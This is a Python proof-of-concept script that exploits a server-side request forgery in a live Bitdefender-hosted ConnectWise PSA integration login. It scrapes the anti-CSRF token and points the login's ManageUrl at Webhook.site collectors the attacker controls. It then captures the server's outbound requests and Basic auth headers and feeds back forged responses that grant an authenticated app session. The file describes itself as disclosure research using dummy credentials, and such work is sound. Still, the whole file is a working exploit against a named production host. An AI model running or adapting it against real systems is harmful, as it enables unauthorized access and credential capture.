#!/usr/bin/env python3
"""Reproduce the ConnectWise PSA SSRF second hop and synthetic app session.

Run from the repository root: python findings/cwpsa-two-hop-poc.py
Requires: pip install requests

Both destinations are fresh researcher-owned Webhook.site collectors. The only
integration credentials are dummy strings. No GravityZone tenant is registered
or modified. A full private transcript is written to the ignored tmp/ folder.
"""

import base64
import json
import re
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

import requests


WEBHOOK = "https://webhook.site"
TARGET = "https://cwpsa.rmm.bitdefender.com"


def create_collector(session: requests.Session, body: str) -> str:
    response = session.post(WEBHOOK + "/token", json={
        "default_status": 200,
        "default_content": body,
        "default_content_type": "application/json",
    }, timeout=15)
    response.raise_for_status()
    return response.json()["uuid"]


def events(session: requests.Session, token: str) -> list[dict]:
    response = session.get(
        f"{WEBHOOK}/token/{token}/requests?sorting=oldest&per_page=100",
        timeout=15,
    )
    response.raise_for_status()
    return response.json().get("data", [])


def http_result(response: requests.Response) -> dict:
    return {"status": response.status_code,
            "location": response.headers.get("Location"),
            "headers": dict(response.headers),
            "body": response.text}


def main() -> int:
    nonce = uuid.uuid4().hex[:12]
    company = "owned" + nonce
    public_key = "dummy-public-" + nonce
    private_key = "dummy-private-" + nonce
    response_marker = "owned-response-" + nonce
    webhook = requests.Session()

    second_body = [{"id": 987654321, "name": response_marker}]
    second = create_collector(webhook, json.dumps(second_body))
    second_url = f"https://{second}.webhook.site"
    info = {
        "CompanyName": "Owned Research Test",
        "CompanyID": company,
        "Codebase": "v4_6_release/",
        "VersionCode": "v2026.1",
        "VersionNumber": "v4.6.99999",
        "IsCloud": True,
        "SiteUrl": second_url,
    }
    first = create_collector(webhook, json.dumps(info))
    first_url = f"https://{first}.webhook.site"

    anonymous = requests.get(TARGET + "/", allow_redirects=False, timeout=15)
    client = requests.Session()
    page = client.get(TARGET + "/login", timeout=15)
    page.raise_for_status()
    match = re.search(
        r'<input[^>]*name="__RequestVerificationToken"[^>]*value="([^"]+)"',
        page.text, re.I | re.S,
    )
    if not match:
        raise RuntimeError("anti-CSRF token missing")
    login = client.post(TARGET + "/login", data={
        "SsoAlias": "",
        "ManageUrl": first_url,
        "ManageCompanyId": company,
        "ManagePublicKey": public_key,
        "ManagePrivateKey": private_key,
        "__RequestVerificationToken": match.group(1),
    }, allow_redirects=False, timeout=25)
    own_root = client.get(TARGET + "/", allow_redirects=False, timeout=15)
    boards = client.get(TARGET + "/api/PluginConfiguration/serviceBoards",
                        allow_redirects=False, timeout=15)
    user_info = client.get(TARGET + "/api/standalone/userinfo",
                           allow_redirects=False, timeout=15)

    first_hits: list[dict] = []
    second_hits: list[dict] = []
    company_hits: list[dict] = []
    boards_hits: list[dict] = []
    for _ in range(10):
        first_hits = [hit for hit in events(webhook, first)
                      if "/login/companyinfo/" + company in hit.get("url", "")]
        second_hits = events(webhook, second)
        company_hits = [hit for hit in second_hits if
                        "/v4_6_release/apis/3.0/company/companies" in hit.get("url", "")]
        boards_hits = [hit for hit in second_hits if
                       "/v4_6_release/apis/3.0/service/boards" in hit.get("url", "")]
        if first_hits and company_hits and boards_hits:
            break
        time.sleep(1)

    expected_basic = f"{company}+{public_key}:{private_key}"
    company_check_uses_dummy_auth = bool(company_hits) and all(
        base64.b64decode(
            hit.get("headers", {}).get("authorization", [""])[0].removeprefix("Basic ")
        ).decode("utf-8", "replace") == expected_basic
        for hit in company_hits
    )
    response_reflected = response_marker in boards.text
    verified = bool(
        first_hits and company_hits and boards_hits
        and company_check_uses_dummy_auth and response_reflected
        and anonymous.status_code == 302
        and login.status_code == 302 and login.headers.get("Location") == "/"
        and own_root.status_code == 200
        and ".AspNetCore.Cookies" in client.cookies
    )

    transcript = {
        "observed_utc": datetime.now(timezone.utc).isoformat(),
        "owned_company": company,
        "collectors": {"company_info": first_url, "psa_api": second_url},
        "collector_responses": {"company_info": info, "psa_api": second_body},
        "bitdefender": {
            "anonymous_root": http_result(anonymous),
            "login": http_result(login),
            "session_root": http_result(own_root),
            "service_boards": http_result(boards),
            "user_info": http_result(user_info),
        },
        "first_hop_events": first_hits,
        "second_hop_events": second_hits,
        "session_cookies": requests.utils.dict_from_cookiejar(client.cookies),
        "company_check_basic_uses_dummy_credentials": company_check_uses_dummy_auth,
        "response_marker_reflected": response_reflected,
        "verified": verified,
    }
    output = Path("tmp") / f"cwpsa-two-hop-{nonce}.json"
    output.parent.mkdir(exist_ok=True)
    output.write_text(json.dumps(transcript, indent=2, ensure_ascii=False),
                      encoding="utf-8")

    print("Anonymous root:", anonymous.status_code,
          anonymous.headers.get("Location"))
    print("Login with synthetic PSA responses:", login.status_code,
          login.headers.get("Location"))
    print("Same-session root:", own_root.status_code,
          "app cookie:", ".AspNetCore.Cookies" in client.cookies)
    print("First-hop callbacks:", len(first_hits))
    print("Second-hop company checks:", len(company_hits),
          "service-board requests:", len(boards_hits))
    for hit in company_hits + boards_hits:
        print(" ", hit.get("method"), hit.get("url"),
              "from", hit.get("ip"))
    print("Company check Basic auth uses supplied dummy values:",
          company_check_uses_dummy_auth)
    print("Service-board request has Basic auth:", all(
        bool(hit.get("headers", {}).get("authorization")) for hit in boards_hits))
    print("Service boards:", boards.status_code, boards.text[:100])
    print("Owned response marker reflected:", response_reflected)
    print("User info:", user_info.status_code, user_info.text[:100])
    print("Proof:", "VERIFIED" if verified else "INCOMPLETE")
    print("Private full transcript:", output.resolve())
    return 0 if verified else 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (requests.RequestException, RuntimeError, ValueError) as exc:
        print("PoC error:", exc, file=sys.stderr)
        raise SystemExit(2)
